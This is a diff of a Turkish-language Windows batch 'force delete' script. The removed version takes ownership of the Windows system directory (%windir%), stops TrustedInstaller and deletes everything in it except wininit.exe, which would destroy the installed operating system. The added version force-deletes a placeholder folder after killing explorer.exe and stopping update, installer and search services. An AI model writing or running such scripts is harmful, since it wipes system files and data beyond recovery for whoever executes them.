@@ -1,7 +1,7 @@
 @echo off
 setlocal EnableDelayedExpansion
-title Belirli Dosyayi Koruyarak Silme Araci
-color 0A
+title Ultra Force Delete Tool - Tüm Dosyaları Sil
+color 0C
 
 :: Yonetici yetkisi kontrolu
 net session >nul 2>&1
@@ -12,18 +12,25 @@ if %errorLevel% neq 0 (
     exit /B 1
 )
 
-:: Silinecek klasorun tam yolunu buraya yazin
-set "targetPath=%windir%"
-set "protectedFile=wininit.exe"
+:: Silinecek klasor yolu
+set "targetPath=C:\Silinecek\Klasor\Yolu"
 
-echo [+] Silme islemi basliyor...
+echo [+] ULTRA FORCE DELETE TOOL BASLATILIYOR...
 echo [+] Hedef: %targetPath%
-echo [+] Korunan dosya: %protectedFile%
 echo.
 
-:: TrustedInstaller servisini durdur
-echo [*] TrustedInstaller servisi durduruluyor...
+:: Acik dosyalari kapat
+echo [*] Acik dosyalar kontrol ediliyor...
+taskkill /F /IM notepad.exe >nul 2>&1
+taskkill /F /IM wordpad.exe >nul 2>&1
+taskkill /F /IM explorer.exe >nul 2>&1
+
+:: Tum servisleri durdur
+echo [*] Kritik servisler durduruluyor...
 net stop TrustedInstaller /y >nul 2>&1
+net stop WuauServ /y >nul 2>&1
+net stop msiserver /y >nul 2>&1
+net stop WSearch /y >nul 2>&1
 
 :: Sistem yetkilerini kaldir
 echo [*] Sistem yetkileri kaldiriliyor...
@@ -36,32 +43,31 @@ takeown /F "%targetPath%" /A /R /D Y >nul 2>&1
 icacls "%targetPath%" /grant:r Administrators:F /T /C /Q >nul 2>&1
 icacls "%targetPath%" /grant:r %username%:F /T /C /Q >nul 2>&1
 
-:: Dosya ve klasorleri silme
-echo [*] Dosyalar ve klasorler siliniyor (korunan dosya haric)...
-for /f "delims=" %%i in ('dir /b /a "%targetPath%"') do (
-    if /i not "%%i"=="%protectedFile%" (
-        echo [*] Siliniyor: %%i
-        rd /s /q "%targetPath%\%%i" 2>nul
-        del /f /q "%targetPath%\%%i" 2>nul
-    ) else (
-        echo [!] Korunuyor: %%i
-    )
-)
+:: Dosya sistemi kontrolu
+echo [*] Dosya sistemi kontrolu yapiliyor...
+chkdsk /F >nul 2>&1
+
+:: Ultra force silme
+echo [*] Ultra force silme basliyor...
+attrib -r -s -h "%targetPath%" /s /d >nul 2>&1
+rd /s /q "%targetPath%" >nul 2>&1
 
 :: Son kontrol
 if exist "%targetPath%" (
-    echo.
-    echo [+] Islemler tamamlandi. Korunan dosya: %protectedFile%
-    echo.
+    echo [!] HATA: Klasor silinemedi!
+    echo [!] Lutfen Windows Guvenli Modda tekrar deneyin.
 ) else (
-    echo.
-    echo [!] HATA: Hedef klasor tamamen silindi!
-    echo.
+    echo [+] BASARILI: Klasor ve tum icerigi silindi!
 )
 
-:: TrustedInstaller servisini yeniden baslat
-echo [*] TrustedInstaller servisi yeniden baslatiliyor...
+:: Servisleri yeniden baslat
+echo [*] Servisler yeniden baslatiliyor...
 net start TrustedInstaller >nul 2>&1
+net start WuauServ >nul 2>&1
+net start msiserver >nul 2>&1
+net start WSearch >nul 2>&1
 
-pause
+echo.
+echo [+] Islem tamamlandi!
+timeout /t 5
 exit /B 0
